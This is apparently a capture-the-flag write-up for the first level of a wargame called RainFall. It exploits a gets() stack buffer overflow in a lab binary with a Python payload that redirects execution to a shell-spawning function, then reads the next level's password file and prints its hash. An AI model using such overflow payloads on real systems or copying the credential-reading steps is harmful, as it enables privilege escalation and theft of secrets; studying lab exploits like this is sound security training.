`$  scp -P 4242 level1@192.168.56.103:/home/user/level1/level1 /home/zouz/Desktop/level1`

we can see than main call gets with a buffer and that there is a function run() that open a bash terminal

```
Temporary breakpoint 1, 0x08048483 in main ()
(gdb) p run()
Good... Wait what?
$ whoami
level1

```

open gdb
```
Starting program: /home/user/level1/level1 <<< $(python -c "print 'A' * 76 + 'BBBB'")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info reg ebp eip
ebp            0x41414141	0x41414141
eip            0x42424242	0x42424242
```

observing the programm and how it reacts with the script above we see that it's vulnerable because we can overflow the buffer with other values and redirect it at the address we want. The best we can hope is to execute a Shell to take over controle with the rights of the user who owns the file.

`
$ echo I | tr -d [:space:] | od -to2 | head -n1 | awk '{print $2}' | cut -c6
On a Big Endian-System (Solaris on SPARC) => 0
On a little endian system (Linux on x86) => 1
`

0x08048444 is the address of the function run
\x44\x84\x04\x08 is the transcription of that address on a little-endian machine

```
python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```
executing in shut the stdin so we have to find a way to keep it open
cat will pump in the output of the python script into an input stream and wait for more inputs until EOF

```
level1@RainFall:~$ (python -c 'print "A"*76+"\x44\x84\x04\x08";' && cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

stack overflow !